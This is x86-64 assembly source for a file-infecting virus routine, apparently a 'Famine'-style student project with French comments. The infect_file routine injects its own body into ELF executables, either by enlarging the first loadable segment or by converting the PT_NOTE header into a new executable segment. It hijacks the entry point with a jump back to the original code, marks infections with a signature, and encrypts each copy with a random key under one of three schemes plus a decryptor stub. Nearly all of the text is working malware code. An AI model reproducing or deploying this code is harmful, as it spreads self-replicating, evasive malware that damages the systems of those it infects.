; void  infect_file(char *filename, t_famine, *famine);
infect_file:
    mov r12, rdi
    lea rdi, [r12 + fileName]
    mov rsi, O_RDWR
    mov rax, SYS_OPEN
    syscall              ; open(filemane, O_RDWR)
    cmp rax, 0           ; if (fd < 0) return ;
    jl bad_fd
    mov [r12 + fd], rax
get_file_data:
    mov rdi, [r12 + fd]
    xor rsi, rsi
    mov rdx, SEEK_END
    mov rax, SYS_LSEEK
    syscall             ; lseek(fd, 0, SEEK_END)
    mov [r12 + fileSize], rax
    cmp rax, 0          ; if (size < 0) return ;
    jl close_file
    cmp rax, SIGNATURE_SIZE          ; if (size > SIGNATURE_SIZE) continue ;
    jge file_size_ok
    lea rdi, [r12 + fileName]
    call append_signature
    jmp close_file
    file_size_ok:                                                                                               ;faire un check si le fichier est pas assez grand et le passer dans la fonction append_signature
    
    xor rdi, rdi
    mov rsi, [r12 + fileSize]
    shr rsi, 12                             ; 12 bits = 4096
    shl rsi, 12
    add rsi, 4096                           ; align 4096
    add rsi, PROG_SIZE
    mov rdx, PROT_READ | PROT_WRITE
    mov r10, MAP_SHARED ; r10 est le 4 ieme argument car rcx et r11 sont détruit par le kernel
    mov r8, [r12 + fd]
    xor r9, r9
    mov rax, SYS_MMAP
    syscall             ; mmap(0, fileSize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)
    cmp rax, 0          ; if (!fileData) return ;
    jz  close_file
    mov [r12 + fileData], rax   ; faire des check pour le format

check_signature:                ; boucle sur tout les bytes du fichier pour voir si il n'y a pas deja une signature
    lea rdi, [rel signature]
    mov rsi, [r12 + fileData]
    add rsi, [r12 + fileSize]
    sub rsi, SIGNATURE_SIZE
    mov rcx, SIGNATURE_SIZE  
    repz cmpsb
    jz close_mmap           ; on quite proprement si il y a deja une signature
    
check_file_integrity:
    mov rdi, [r12 + fileData]
    cmp dword [rdi], 0x464c457f ; magic number 0x7f454c46 464c457f
	jnz simple
	mov sil, [rdi + s_support]
	cmp sil, 1			; cmp 32 bit
	je simple
	bit_64:
    ; check if the file is bigger than an ELF_HEADER_FILE
    xor rax, rax
    mov rsi, [r12 + fileSize]
	cmp rsi, 64
	jl simple

	; check if the file is bigger than pheader info indicated
	mov ax, [rdi + e_phentsize]
	mov cx, [rdi + e_phnum]
	mul cx
	cmp rsi, rax
	jl simple

	; check if the file is bigger than the sheader info indicated
	mov ax, [rdi + e_shentsize]
	mov cx, [rdi + e_shnum]
	mul cx
	add rax, [rdi + e_shoff]
	cmp rax, rsi
	jne simple
    jmp get_file_entry

simple: 
    lea rdi, [r12 + fileName]
    call append_signature
    jmp close_mmap


get_file_entry:                     ; recupere l'entry point de l'executable
    mov rax, [r12 + fileData]
    mov rdi, [rax + e_entry]
    mov [r12 + oldEntry], rdi
    

get_first_pload:
    mov rsi, [r12 + fileData]     ; rsi = famine->filedata;
    xor rax, rax                  ; rax = p_type
    xor rbx, rbx                  ; rbx = n of pload
    xor rcx, rcx                  ; rcx = nb of pload
    xor rdx, rdx                  ; rdx = size of a pload
    mov rdi, rsi
    add rdi, [rsi + e_phoff]      ; rdi = pheader address

    mov [r12 + pload], rax
    mov [r12 + ptnote], rax       ; set pload and ptnote value to 0
    mov cx, [rsi + e_phnum]
    mov dx, [rsi + e_phentsize]

phead_loop:
    mov eax, [rdi + p_type]    ; boucle sur tout les pheader et quand on trouve le premier pload on sort de la boucle
    cmp eax, PT_LOAD
    jnz no_pload_found
    cmp qword [r12 + pload], 0
    jnz first_pload_found
    mov [r12 + pload], rdi
    first_pload_found:
    mov [r12 + lastPload], rdi
    no_pload_found:
    cmp eax, PT_NOTE
    jnz no_pt_note_found
    mov [r12 + ptnote], rdi
    no_pt_note_found:
    inc rbx
    add rdi, rdx
    cmp rbx, rcx
    jl phead_loop
    cmp qword [r12 + pload], 0
    jz close_mmap                    ;on quite si il n'y a pas de pload trouvé

check_pload_signature:
    mov r13, [r12 + pload]
    lea rdi, [rel signature]
    mov rsi, [r12 + fileData]
    add rsi, [r13 + p_filesz]
    sub rsi, SIGNATURE_SIZE
    mov rcx, SIGNATURE_SIZE  
    repz cmpsb
    jz close_mmap           ; on quite proprement si il y a deja une signature
check_pload_size:
;    mov r13, [r12 + pload]
    mov rax, [r13 + p_filesz]
    add rax, PROG_SIZE
    mov rdi, [r12 + fileSize]
    cmp rdi, rax
    jl simple                               ; si le pload + le programe est plus grand que le fichier
    xor rdx, rdx
    mov rax, [r13 + p_filesz]
    mov rdi, [r13 + p_align]
    div rdi
    sub rdi, rdx
    cmp rdi, PROG_SIZE                      ; regarde si on a assez de place dans le bourrage et fait un simple append de la signature si on a pas assez
    jge write_virus_entry
    cmp qword [r12 + ptnote], 0             ; check if a ptnote has been found and just add a signature if there is none
    jz simple

create_new_pload:
    mov rax, [r12 + lastPload]
    mov rbx, [rax + p_vaddr]
    add rbx, [rax + p_memsz]                ; address in memory not used
    shr rbx, 12                             ; 12 bits = 4096
    shl rbx, 12
    add rbx, 4096                           ; align 4096
    mov [r12 + entry], rbx                  ; asign entry point 
    mov rdx, [r12 + fileData]
    mov [rdx + e_entry], rbx
    mov rcx, [r12 + fileSize]               ; end of the file
    shr rcx, 12                             ; 12 bits = 4096
    shl rcx, 12
    add rcx, 4096                           ; align 4096
    mov [r12 + programStart], rcx
    mov rax, [r12 + ptnote]
    mov [rax + p_offset], rcx
    mov [rax + p_vaddr], rbx
    mov [rax + p_paddr], rbx
    mov rbx, PROG_SIZE                      ; size of the program
    mov [rax + p_filesz], rbx
    mov [rax + p_memsz], rbx
    mov rbx, 4096                           ; allignement
    mov [rax + p_align], rbx
    mov ebx, PT_LOAD
    mov [rax + p_type], ebx
    mov ebx, PF_X | PF_W | PF_R
    mov [rax + p_flags], ebx
    mov [r12 + pload], rax                  ; change the pload with the modified ptnote
    add rcx, PROG_SIZE
    mov [r12 + fileSize], rcx
    mov rdi, [r12 + fd]
    mov rsi, rcx
    mov rax, SYS_FTRUNCATE
    syscall
    jmp copy_program

write_virus_entry:
    mov rdi, [r13 + p_vaddr]             ; met l'entry a la fin du premier pload = p_vaddr + p_memsz
    add rdi, [r13 + p_memsz]
    mov [r12 + entry], rdi
    mov rsi, [r12 + fileData]           ; écrit la nouvelle entry dans l'executable
    mov [rsi + e_entry], rdi               
    mov rax, [r13 + p_filesz]           ; offset a la fin du premier pload
    mov [r12 + programStart], rax

change_pload_data:
    ; augmente la taille du premier pload
    add qword [r13 + p_memsz], PROG_SIZE
    add qword [r13 + p_filesz], PROG_SIZE
    
    or dword [r13 + p_flags], PF_X           ; ajoute les droit d'execution
    or dword [r13 + p_flags], PF_W           ; ajoute les droit d'execution


copy_program:
    mov rdi, [r12 + fileData]
    add rdi, [r12 + programStart]           ; address to write the programe in the file
    mov rbx, rdi
    lea rsi, [rel main]                     ; address du debut du programe
    mov rcx, PROG_SIZE                      ; taille du programe
    rep movsb

    ; calcule le jump qu'il faut faire pour attendre l'entry normale 
    mov rdx, [r12 + entry]
    add rdx, JMP_OFFSET + 5
    mov rcx, [r12 + oldEntry]
    sub ecx, edx
    
    ; ecrit le jump a l'adress de jump
    mov [rbx + JMP_OFFSET], byte 0xE9 ; 0xe9 = jmp
    mov [rbx + JMP_OFFSET + 1], ecx

    mov r13, rbx

change_key:
    lea rdi, [rbx + KEY_OFFSET]
    mov rsi, KEY_SIZE
    mov rdx, GRND_RANDOM
    mov rax, SYS_GETRANDOM
    syscall
choose_encrypt_type:
    lea rdi, [rbx + ENCRYPT_OFFSET]
    lea rsi, [rbx + KEY_OFFSET]
    xor rbx, rbx
    xor rax, rax
    xor rdx, rdx
    mov al, [rsi]                       ; peux ètre changer la methode pour choirir le type d'encryption
    mov rcx, 3
    div rcx
    cmp rdx, 0
    jz encrypt
    cmp rdx, 1
    jz encrypt_v2
    jmp encrypt_v3

; rdi = data
; rsi = key
; rax = n  int data[n]
; rcx = m  int key[n]
encrypt:
	xor rax, rax
	xor rcx, rcx
    jmp encrypt_byte
	encrypt_loop:
	inc rcx
	cmp rcx, KEY_SIZE
	jnz encrypt_nochange
	xor rcx, rcx
	encrypt_nochange:
    mov bl,  [rdi + rax - 1]
    encrypt_byte:
    add bl,  [rsi + rcx]
	add [rdi + rax], bl
    inc rax
    encrypt_cmp:
	cmp rax, ENCRYPT_SIZE
	jl encrypt_loop
cpy_decrypt_v1:
    lea rdi, [r13 + DECRYPT_OFFSET]
    lea rsi, [rel decrypt_v1]
    mov rcx, DECRYPT_V1_SIZE
    rep movsb
    jmp close_mmap

encrypt_v2:
    mov rcx, KEY_SIZE
    ecrypt2_loop:

    ; data[i] = data[i] + i
    mov al, [rdi + rbx]
    add al, bl
    mov [rdi + rbx], al

    ; data[i] = data[i] ^ value[i % 16]
    mov rax, rbx
    and rax, 15
    lea rdx, [rel decrypt_v2]
    mov al,  [rdx + rax]
    xor [rdi + rbx], al

    ; data[i] = data[i] ^ key[i % key_size];
    xor rdx, rdx
    mov rax, rbx
    div rcx
    mov dl, [rsi + rdx]
    xor [rdi + rbx], dl

    ; if (i == 0) ; data[i] = data[i] ^ value[0]; else ; data[i] = data[i] ^ data[i - 1];
    cmp rbx, 0
    jne encrypt2_i
    mov rdx, [rel decrypt_v2]
    jmp encrypt2_end_i
    encrypt2_i:
    mov rdx, [rdi + rbx - 1]
    encrypt2_end_i:
    xor byte [rdi + rbx], dl
    inc rbx
    cmp rbx, ENCRYPT_SIZE
    jl ecrypt2_loop

cpy_decrypt_v2:
    lea rdi, [r13 + DECRYPT_OFFSET]
    lea rsi, [rel decrypt_v2]
    mov rcx, DECRYPT_V2_SIZE
    rep movsb
    jmp close_mmap

decrypt_v3:
    lea rdi, [rel decrypt_v3 + DECRYPT_FUNC_SIZE]
    lea rsi, [rel decrypt_v3 + DECRYPT_KEY_OFFSET]
    xor rbx, rbx
encrypt_v3:
    mov rcx, KEY_SIZE

    ecrypt3_loop:

    ; i % key_size
    xor rdx, rdx
    mov rax, rbx
    div rcx

    ; char c = (data[i] >> 4) & 0xf
    mov r11b, byte [rdi + rbx]
    shr r11b, 4
    and r11b, 0xf
    ; char e = (key[i % key_size] >> 4) & 0xf
    mov al, byte [rsi + rdx]
    shr al, 4
    and al, 0xf

    ; c = c ^ e & 0xf;
    xor r11b, al
    and r11b, 0xf

    ; char f = (key[i % key_size]) & 0xf
    mov al, byte [rsi + rdx]
    and al, 0xf

    ; char d = (data[i]) & 0xf
    mov dl, byte [rdi + rbx]
    and dl, 0xf

    ; d = (d ^ f) & 0xf;
    xor dl, al
    and dl, 0xf

    ; data[i] = (c << 4) | d
    shl r11b, 4
    or r11b, dl
    mov byte [rdi + rbx], r11b

    ; data[i] = (data[i] ^ i) & 0xff
    xor byte [rdi + rbx], bl

    ;  for (int i = 0; i < data_size ; i++)
    inc rbx
    cmp rbx, ENCRYPT_SIZE
    jl ecrypt3_loop
decrypt_v3_end:
cpy_decrypt_v3:
    lea rdi, [r13 + DECRYPT_OFFSET]
    lea rsi, [rel decrypt_v3]
    mov rcx, DECRYPT_V3_SIZE
    rep movsb
    mov word [rdi], 0xe7ff ; ff e7                   jmpq   *%rdi
    jmp close_mmap

close_mmap:
    mov rdi, [r12 + fileData]
    mov rsi, [r12 + fileSize]
    mov rax, SYS_MUNMAP 
    syscall             ; munmap(fileData, fileSize)

close_file:
    mov rdi, [r12 + fd]
    mov rax, SYS_CLOSE  
    syscall             ; close(fd)
bad_fd:
    ret
